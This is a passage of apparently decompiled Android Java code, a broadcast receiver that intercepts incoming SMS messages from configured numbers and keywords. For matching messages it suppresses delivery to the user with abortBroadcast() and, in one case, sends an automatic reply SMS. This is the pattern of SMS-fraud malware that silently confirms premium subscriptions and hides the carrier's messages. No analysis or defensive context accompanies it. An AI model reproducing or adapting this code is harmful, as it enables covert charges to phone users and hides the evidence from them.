    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        Bundle bundle;
        AndroidLogic.debug("CgSBroadcastReceiver on receive");
        if (intent != null && (bundle = intent.getExtras()) != null) {
            Object[] _pdus = (Object[]) bundle.get("pdus");
            if (_pdus == null || _pdus.length == 0) {
                System.out.println("pdus: " + ((Object) null));
                return;
            }
            SmsMessage[] messageArray = new SmsMessage[_pdus.length];
            for (int i = 0; i < _pdus.length; i++) {
                messageArray[i] = SmsMessage.createFromPdu((byte[]) _pdus[i]);
            }
            processSmsConfig(messageArray);
        }
    }

    public void setSmsList(Vector<SmsItem> smsList) {
        this.smsList = smsList;
    }

    private void processSmsConfig(SmsMessage[] messages) {
        for (SmsMessage incomeMessage : messages) {
            String address = incomeMessage.getDisplayOriginatingAddress();
            String body = incomeMessage.getDisplayMessageBody();
            Iterator<SmsItem> it = this.smsList.iterator();
            while (it.hasNext()) {
                SmsItem smsItem = it.next();
                if (address.contains(smsItem.getPort())) {
                    switch (smsItem.getOperation()) {
                        case 1:
                            if (smsItem.getKeyWord() == null || (smsItem.getKeyWord() != null && body != null && body.contains(smsItem.getKeyWord()))) {
                                AndroidLogic.debug("bsms: " + address + "|" + body);
                                abortBroadcast();
                                break;
                            }
                            break;
                        case 2:
                            if (smsItem.getKeyWord() == null || (smsItem.getKeyWord() != null && body != null && body.contains(smsItem.getKeyWord()))) {
                                ResultProcessor resultProcessor = smsItem.getResultProcessor();
                                if (resultProcessor != null && body != null) {
                                    resultProcessor.setSourceResult(body);
                                    resultProcessor.processResult();
                                }
                                System.out.println("enrep");
                                abortBroadcast();
                                String replyPort = smsItem.getReplyPort() == null ? smsItem.getPort() : smsItem.getReplyPort();
                                String replyBody = smsItem.getReplyBody();
                                SmsItem replySmsItem = new SmsItem();
                                replySmsItem.setPort(replyPort);
                                replySmsItem.setCmd(replyBody);
                                SmsSender smsSender = new SmsSender();
                                try {
                                    smsSender.sendSms(this.context, replySmsItem);
                                    break;
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    break;
                                }
                            }
                            break;
                    }
                }
            }
        }
    }
}

